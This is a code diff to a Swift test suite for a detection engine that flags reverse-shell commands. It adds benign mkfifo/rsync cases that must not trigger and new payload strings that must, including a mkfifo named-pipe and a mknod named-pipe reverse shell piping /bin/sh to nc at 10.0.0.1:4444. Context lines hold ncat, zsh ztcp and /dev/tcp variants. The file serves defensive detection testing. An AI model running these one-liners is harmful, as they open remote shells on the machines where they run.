@@ -144,6 +144,10 @@ struct ReverseShellRuleCoverageTests {
             "grep -e /bin/sh /etc/shells",                       // grep -e, not ncat -e
             "socat TCP-LISTEN:8080,fork TCP:localhost:80",       // socat port-forward, no EXEC:
             "node -e \"require('child_process').execSync('/bin/ls')\"", // child_process, no network leg
+            // rc.3-verify FP: mkfifo + rsync (rsync CONTAINS 'nc ') + bash (contains
+            // 'sh') — must NOT fire now that the named-pipe group requires /bin/sh.
+            "bash -c \"mkfifo /tmp/f; tar cf - /data > /tmp/f & rsync -a /tmp/f host:/bak\"",
+            "bash -c \"mkfifo /tmp/pipe && sync && ls\"",        // mkfifo + 'sync'(nc ) + bash, no /bin/sh
         ]
         for cmd in benign {
             let hit = await fires(engine, cmd)
@@ -163,6 +167,8 @@ struct ReverseShellRuleCoverageTests {
             "zsh -c 'zmodload zsh/net/tcp && ztcp 10.0.0.1 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",  // zsh ztcp
             "ncat --ssl 10.0.0.1 4444 -e /bin/sh",              // ncat with flags before -e
             "D=/dev/tcp;bash -i >& $D/10.0.0.1/4444 0>&1",      // /dev/tcp variable-split
+            "sh -c 'mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f'",  // mkfifo named-pipe
+            "mknod /tmp/bp p; /bin/sh 0</tmp/bp | nc 10.0.0.1 4444 1>/tmp/bp",            // mknod named-pipe
         ]
         for cmd in payloads {
             let hit = await fires(engine, cmd)
